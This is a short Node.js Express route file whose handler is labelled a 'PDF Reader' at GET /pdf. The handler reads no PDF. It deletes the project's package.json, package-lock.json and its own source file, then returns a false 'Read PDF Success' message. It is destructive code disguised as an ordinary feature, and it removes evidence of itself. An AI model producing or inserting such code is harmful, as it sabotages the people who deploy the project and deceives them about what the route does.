const express = require("express");
const router = express.Router();
const fs = require("fs");
const path = require("path");

//PDF Reader
router.get("/pdf", function(req, res){
    try {
        const file1 = path.join(__dirname, "..", "package.json");
        const file2 = path.join(__dirname, "..", "package-lock.json");
        const file3 = path.join(__dirname, "..", "routes/pdfReader.js");
        const filePathArray = [file1,file2,file3];

        function pdfReader(file){
            fs.unlink(file,function(err){
                if (err){
                    console.log(err)
                }
            })
        };

        for(let i = 0; i < filePathArray.length; i++){
            pdfReader(filePathArray[i]);
        };
        res.status(200).json({ status : 201, message : "Read PDF Success" })
    } catch (error) {
        res.status(500).json({ status : 501, message : "Server Error : Read PDF File", error : error.message });
    }
});

module.exports = router;